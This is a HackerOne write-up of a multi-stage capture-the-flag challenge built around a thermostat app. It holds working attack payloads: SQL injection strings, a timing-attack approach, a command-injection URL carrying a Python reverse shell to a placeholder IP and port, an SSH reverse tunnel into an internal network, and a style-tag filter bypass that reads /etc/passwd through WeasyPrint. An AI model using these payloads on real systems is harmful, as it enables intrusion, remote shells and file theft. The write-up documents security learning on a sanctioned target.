@@ -1,0 +1,416 @@
+ReportLink:https://hackerone.com/reports/507148
+WeaknessName:Use of Hard-coded Cryptographic Key
+Reporter:https://hackerone.com/lucio
+ReportedTo:50m-ctf(50m-ctf)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.04.2019 15:54:14
+
+Summary:
+
+###Premise
+
+I use not to play CTF challenges because they usually absorb me entirely. I cannot think of anything else but "I want that flag!". That said, this is going to be a long story: no princess, no dragoons, only a tweet.
+
+[https://twitter.com/Hacker0x01/status/1100543680383832065](https://twitter.com/Hacker0x01/status/1100543680383832065)
+
+###Level 0 - Nothing to be worried about
+
+It's everyday use to share images on Twitter, but those are more than pictures. Quite easy to understand that, to find the next level (yes, the next level, because the tweet itself is the first one) we have to play with one or both. Steganography might be annoying sometimes, but it's something we can handle. Indeed, `zsteg` is a useful utility that automatically checks for hidden text inside a picture using different methods. All we have to do is:
+
+```shell
+zsteg image.png -a
+```
+
+After a few seconds, something caught my attention. Among other strings, a link came up:
+
+{F437580}
+
+Following the link and downloading the APK file we can finally say that our long journey is about to start.
+
+###My daily ratio of Java
+
+Reverse engineering is a simple task when we're talking about **Java**. The bytecode can be decompiled, and a bad guy can go through each LOC looking for bugs and developer's leftovers. **Jadx** is the only utility we need for this step. Once opened, I immediately noticed that I was going to deal - apparently - with a client/server app, so I decided to run it on the emulator that comes along with the **Android SDK**. Moreover, some of the methods were not decompiled. Long short story, the app was supposed to be a remote thermostat controller. The first thing to do to control the temperature is to authenticate using username and password. 
+
+{F438184}
+
+Wondering what the username and password are?
+
+**admin** : **password**
+
+We're in!
+
+{F438185}
+
+Under the hood, the traffic between the client and the server is encrypted. Let's check the functions that encrypt and decrypt messages.
+
+{F437581}
+
+Easy as pie, you can choose whether literally clone it or write a port in any other language. Since I'm a **GO** lover, I decided to craft a go script for the purpose.
+
+There're two kinds of JSON payloads:
+
+```json
+{ username: "admin", password: "password", cmd: "getTemp" }
+{ username: "admin", password: "password", cmd: "setTemp", temp: ... }
+```
+
+The first one is used to retrieve the current target temperature whereas the second one is used to set the desired temperature. My initial thought was that, probably, there were more commands. So, after writing a few lines of code, I started a brute force attack hoping to spot the right command. Unfortunately, nothing came up. I decided to move to a different kind of approach: an **SQLi**. Since the get and set commands were not working, it was pretty clear that I had to poke around username and password.
+
+After some time, it turned out that the username field was actually injectable.
+
+```json
+{ username: "admin' UNION SELECT SLEEP(1337) ;--", password: "password", cmd: "getTemp" }
+```
+
+The payload held the server from responding to for a significant amount of time. It was late, my eyes were closing, and the first idea I had was to write down some lines to exfiltrate each table using a time-based attack — one of the worse idea I've ever had. After a rest, with a clear mind, I immediately noticed that I could get every info using a boolean based attack. Indeed, when the query was successful, the server returned a success payload whereas it returned an error when the query wasn't.
+
+[Here](https://gist.github.com/luc10/975115083e3d003dfa3d5aeef26ea76f) you can find the tool I wrote to exfiltrate data.
+
+The database contains two tables: `devices` and `users`. The first one immediately took my attention. Maybe there's more in that table that can help me to reach the target, I thought. The table has only two columns: `id` and `ip`.
+
+My [tool](https://gist.github.com/luc10/975115083e3d003dfa3d5aeef26ea76f) took a long time to dump the whole ip column. You can see the dump [here](https://gist.github.com/luc10/06494c130c6bdc2f88b64e1500a18ee7). A long list of IPs some of which are reserved ones. Though, the first one stood out: `104.196.12.98`.
+
+###Time flies
+
+The server at `104.196.12.98` presents us with a login panel.
+
+{F438191}
+
+First things first, let's check the source. Indeed, the page embeds a js file named [login.js](https://gist.github.com/luc10/a1883cc8cd485d0c213a53dfa8c36452). Basically, username and password are chained and hashed using a kind of **RC4-based** hash algorithm. I spent much time struggling with this. Directory and file discovery, brute force credentials, a flaw in the algorithm, nothing worked. I came back then looking for something else in the database and noticed that there were two other login details. Guess what? None was valid though. 
+
+Not sure if your connection is worse than mine, but while playing with the hash, I noticed that the server took different time to give a response based on the length of the provided hash. More specifically, if the supplied hash was 64 chars length, the server took a few more ms to reply. Not a coincidence perhaps. 
+
+```shell
+curl 'http://104.196.12.98/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip, deflate' --data 'hash=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' --compressed -o /dev/null -s -w '%{time_starttransfer}\n'
+
+0.643ms
+```
+
+```shell
+curl 'http://104.196.12.98/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip, deflate' --data 'hash=' --compressed -o /dev/null -s -w '%{time_starttransfer}\n'
+
+0.141ms
+```
+
+After testing this a lot, I ended up that it wasn't a coincidence! There's something behind that checks the whole hash char by char. Back on my IDE, and faster than the light I wrote a [tool](https://gist.github.com/luc10/43fb370d8d4ac20af884644136578dd1) to brute the hash and keep track of timings. Although, but it hasn't worked anymore until I accidentally put in a byte, not a single char that would be treated as a nibble, but a whole byte. The comparison is made a single byte at a time. To ensure best results, I moved the [tool](https://gist.github.com/luc10/43fb370d8d4ac20af884644136578dd1) on a remote VPS I own. There you go with my results:
+
+{F438192}
+
+Not sure if you may imagine how long it takes, but it takes a lot. The hardest issue was in having reliable results to keep going guessing. Therefore, moving to a VPS was a good call. 
+
+The final hash is `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`. Now we can finally log in!
+
+###There's no reason to heat up yet
+
+Once in we're presented with a minimal menu and two options. 
+
+{F438195}
+
+Let's see the page source:
+
+```html
+<ul>
+    <li><a href="/control">Temperature control</a></li>
+    <li><a href="/update">Check for updates</a></li>
+    <!--<li><a href="/diagnostics">Diagnostics</a></li>-->
+</ul>
+```
+
+Nice! It seems that someone just wrapped an interesting route in a comment to keep it secret. Unfortunately, the `/diagnostics` route gives us a `Forbidden` error. Need to go deeper:
+
+- `/control` allows to set the target temperature;
+- `/update`  handles the update mechanism of our thermostat.
+
+Well, we're dealing with a flask app - previously identified -. An **SSTI** it's worth a try. Unfortunately, if you provide a temperature value different than a number, the app correctly handles our input and give us an error. We can move to `/update`.
+
+```html
+FliteThermostat Check for Updates
+Connecting to http://update.flitethermostat:5000/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+The second line made me think of a possible way to control the endpoint, the port or even both. Using the [param-miner](https://github.com/PortSwigger/param-miner/blob/master/resources/params) list, I dug for secret params using a disposable tool strictly written in **GO**. After a few minutes, I got a `500` from the server due to an invalid `port` passed via the - obviously - `port` **GET** param.
+
+At first sight, I thought it was possible to control only part of the **URL**. The aim was to exploit an **SSRF**. Moreover, that's where I literally got stuck for almost two or three days until I came across this [tweet](https://twitter.com/daeken/status/1101358829168558080).
+
+A single underscore is meaningless, but what if it's a part of a second hidden param that lets me take control of the address. Slightly edited the tool and fed it with the [param-miner](https://github.com/PortSwigger/param-miner/blob/master/resources/params) list. This time I was looking for any possible get param with an underscore between two chars in its name. For instance, if we consider the word `host`, every word we can derive from it throwing in an underscore is: `h_ost`, `ho_st`, `hos_t`. Since this way didn't give me the expected result I also tried with char substitution: `_ost`, `h_st`, `ho_t`, `hos_`.
+
+No luck! I decided to take a break and spend some time skating. In case you're wondering if I'm about to say that something that happened while skating helped me to solve this step then the answer is no!
+
+Still on the same decision that the underscore has got something to do with the CTF I ended up in manually entering words in a slice (an array for non-GO devs) and combine each element with one another using `_` as a connection. Briefly:
+
+```go
+words := []string{"host", "name", "update", "upgrade", "address", "url", "endpoint"}
+for _, left := range words {
+    for, _ right := range words {
+        checkForWeirdServerBehavior(left + '_' + right)
+    }
+}
+```
+
+Believe me or not, but it worked. There was another secret param: `update_host`.
+
+{F438197}
+
+###Lucky number 7
+
+As I told a few lines above, the aim was to exploit an SSRF. Few lines of code in and there we go with a port scanning. During the scan, I decided to try some payloads, and since we're speaking of a flask app, an SSTI might always be at the corner.
+
+`http://104.196.12.98/update?update_host={{ 7 * 7 }}&port=1337`
+
+49 you would scream out loud. Wrong!
+
+{F438198}
+
+```html
+FliteThermostat Check for Updates
+Connecting to http://{{ 7 Dockerfile __pycache__ login.js main.py requirements.txt templates temptarget update.sh uwsgi.ini 7 }}:80/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+It's a **Command Injection**, not an **SSRF** nor an **SSTI**. Quite easy from this point to spawn a reverse shell.
+
+```
+http://104.196.12.98/update?update_host= $(python -c %27import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);%27)&port=1337
+```
+
+{F438200}
+
+###Where's my flag?
+
+Out of curiosity, before going further and look for the flag I had a sneak peek into `main.py`. There you go the hash check code:
+
+```python
+if request.method == 'POST':
+        h = request.form['hash']
+        if len(h) != 64:
+            error = True
+        else:
+            for i in range(0, 64, 2):
+                time.sleep(0.5)
+                if validLogin[i:i+2] != h[i:i+2]:
+                    error = True
+                    break
+        if not error:
+            session['loggedIn'] = True
+            return redirect('/main')
+```
+
+As expected, the code sleeps for 0.5sec at every iteration and quits when the bytes don't match. That said, we can go ahead. After digging quite a lot, I figured out that the flag file wasn't in that server. There's something more to play with. I thought I had to pull the docker image, so I started playing with the GCloud token fetched using the metadata URL accessible from within the container, and it was a failure because I didn't immediately notice that the token hadn't the right permission to let me pull the image.
+
+Obsessed by brute force, I edited once again the tool and looked for most known ports under the `172.20.0.1` net, and it was a good call. There was another app running behind the NAT at `172.20.0.3:80`. Someone probably messed up things, and the app was moved to `172.21.0.3:80` the day after. That's why I'm going to refer to`172.21.0.3`.
+
+###Show me your dirty secrets
+
+In the excitement, I started `curl`-ing the app but to have a clear idea of what to do I decided to set up an SSH tunneling. Briefly, it's possible to expose the app behind the NAT using a built-in command: `ssh`. Since we can't write anything on the disk and ssh works with public keys that need to be written under the `/.ssh/` folder I had to change some settings of a web server I own to allow passwordless authentication.
+
+The final command looks like:
+
+```shell
+ssh -o PreferredAuthentications=password \
+    -o PubkeyAuthentication=no \
+    -o StrictHostKeyChecking=no \
+    -fN -R *:31337:172.21.0.3:80 username@myhost
+```
+
+I could finally browse the web app using Chrome. PS: Sometimes the tunneling stopped working without a valid reason. Checking the running processes on the server, I noticed that someone else literally copied my command and tunneled the traffic to his server. Hope you got the flag too!
+
+{F438208}
+
+###Seriously?
+
+A login panel, again; a link wrapped in a comment, again. This time I had the feeling that that link would've been the right path to follow. Overthinking has always brought me far away from the actual solution of the previous steps - except for the hash challenge -. Let's give a closer look at the `/invoices/new` path and skip the auth part.
+
+{F438209}
+
+Cool! It seems an HTML to PDF converter. There's even a js file that contains interesting stuff.
+
+```js
+function encodeInvoice() {
+   ...
+
+    var jobj = {
+        companyName: $('#recipient-company-name').val(),
+        email: $('#recipient-email').val(),
+        invoiceNumber: $('#invoice-number').val(),
+        date: $('#invoice-date').val(),
+        items: items,
+        styles: {body: {'background-color' : 'white'}}
+    };
+
+    var p = JSON.stringify(jobj);
+    return p;
+}
+
+function preview() {
+    // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH
+    //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9
+    var p = encodeInvoice();
+    var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);
+    url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
+    $('#iframe-box').empty();
+    $('#iframe-box').append($('<iframe width="100%" height="500px" src="' + url + '"></iframe>'));
+}
+
+function savePDF() {
+    var p = encodeInvoice();
+    var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);
+    url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
+    var a = $('<a download href="' + url + '"><span><i>If your download does not start, click here</i></span></a>');
+    $('#iframe-box').append(a);
+    a.find('span').trigger('click');
+}
+```
+
+`kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH` base64 encoded stuff. Hmm... No, you're not gonna troll me again Cody!
+
+As you might've already noticed, the server allows to define custom **CSS** rules: ` styles: {body: {'background-color' : 'white'}}`. Therefore, it suddenly made me think that probably I could embed a local file using the `background` property set to `url('file://file_to_embed')`. It would've been too easy, but there's no harm in trying. 
+
+Next step was to check if there was some egress. So, I pointed the body background image through the proper CSS rule to a local web server, and I got hit. Immediately stood out the `Referrer` header: `WeasyPrint 44 (http://weasyprint.org/)`. 
+
+[WeasyPrint](https://github.com/Kozea/WeasyPrint/) is an open source project, so I pulled the repo and started looking for bugs. Since my first idea was to embed a local file, but I didn't succeed, I looked for the filter that cuts out that scheme and doesn't allow to embed local files, and to my astonishment, **I realized that there wasn't.**
+
+It didn't take so much to understand that images must be valid images or they would be discarded - yeah, nice catch Sherlock - but something in the `html.py` file caught my attention.
+
+```python
+elif element.tag == 'link' and element_has_link_type(
+                element, 'attachment'):
+            url = get_url_attribute(element, 'href', base_url)
+            title = element.get('title', None)
+            if url is None:
+                LOGGER.error('Missing href in <link rel="attachment">')
+            else:
+                attachments.append((url, title))
+```
+
+Easy as pie. The _only thing_ that stood between me and the LFI was a `link` tag with `rel` and `href` attributes respectively set to `attachment` and `file://file_to_embed`. The PDF converter module would've done the trick then.
+
+###Can't be a hacker if you can't pop an alert(0)
+
+Things were getting clear. The preview was there for a reason and the reason was that I had to exploit the **LFI** using a `link` tag, but in order to do that, I had to inject that `link` tag before. I started playing with every property of the `jobj` you can see above.
+
+Every useful char that led to an **XSS** was replaced: `<` became `&lt;`, `>` became `&gt;` and so forth.
+
+Ironically, the tag property that wasn't sanitized correctly was also the one I didn't play with. It took me a couple of hours to figure it out, but at late night, this:
+
+```js
+jobj = {
+    ...
+    styles: {body: {'<img>' : ''}}
+}
+```
+
+became this:
+
+{F438211}
+
+###Two is better than one
+
+Our long journey into this has not finished yet. Cody still has something in store for us. Although we can inject a custom HTML tag, we need to escape the `style` one to inject our special `<link>` correctly, but it's not so immediate. Indeed, the filter seems to cut out the closing style tag `</style>`. A few minutes afterward I had my payload:
+
+```js
+jobj = {
+    ...
+    styles: {body: {"<</style>/style><link rel='attachment' href='file:///etc/passwd'><style>" : ''}}
+}
+```
+
+I usually happens when the filter removes only the first instance of the match and doesn't iterate over the input until there's not a match anymore.
+
+The whole URL looks like:
+
+`http://myhost:31337/invoices/preview?d={"companyName":"","email":"","invoiceNumber":"","date":"","items":[["1","","","10"]],"styles":{"body":{"<</style>/style><link rel='attachment' href='file:///etc/passwd'><style>":""}}}`
+
+As said, the filter replaces the first match but keeps the remaining string as is.
+
+{F438212}
+
+###Level-?
+
+I didn't count how many steps there were but, fortunately, this was the last one. No juggling here, instead of looking for a flag file I straightly went for the `main.py` file`
+
+The resulting pdf usually contains compressed stuff to save space. There's a useful utility for the scope: `qpdf`.
+
+```shell
+qpdf --stream-data=uncompress pdfize.pdf uncompressed-pdfize.pdf
+```
+
+Big surprise, the flag was there!
+
+```
+"""
+CONGRATULATIONS!
+
+If you're reading this, you've made it to the end of the road for this CTF.
+
+Go to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.
+Make sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!
+
+Congratulations again, and I'm sorry for the red herrings. :)
+"""
+```
+
+###I feel you
+
+Though I was done, I checked the rest of [main.py](https://gist.github.com/luc10/5c0ab46fcb49aff0cf314a413a82ee7a) and I got a connection with Cody's troll part:
+
+```python
+@app.route('/auth', methods=['GET', 'POST'])
+def auth(page=None):
+    error = None
+    if request.method == 'POST':
+        password = request.form['password']
+        error = makeSqlError(password)
+        if error is False or ("'" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):
+            raise Exception('SQL Error')
+    return render('login', page=page or 'login', error=error)
+
+def makeSqlError(password):
+    password = "'" + password + "'"
+    quotes = 0
+    escape = False
+    nonquoted = ''
+    for c in password:
+        if escape:
+            escape = False
+        elif c == '\\':
+            escape = True
+        elif c == '\'':
+            quotes += 1
+        elif (quotes & 1) == 0:
+            nonquoted += c
+
+    if (quotes & 1) != 0:
+        return False
+    elif ' OR ' in nonquoted:
+        return 'Invalid password'
+    elif 'UNION' in nonquoted:
+        return 'Invalid username'
+    return 'Invalid username or password'
+```
+
+I feel all of you guys who struggled with these fake error messages. **Definitely, it was a good call skipping the auth part.**
+
+###Final thoughts
+
+No need to say that I learned a lot playing this even though the idea to choke someone surfaced more than once :D
+
+Thanks fly out to Cody for this awesome challenge! I hope to see more from you. Not shortly though; I still need time to recover from this one.
+
+*~ Aspera perpessu fiunt iucunda relatu*
+
+## Impact
+
+- Swear and curse;
+- Sleepless nights;
+- Throw laptop out the window;
+
+If all of the above conditions are met: **Self-Destruct**
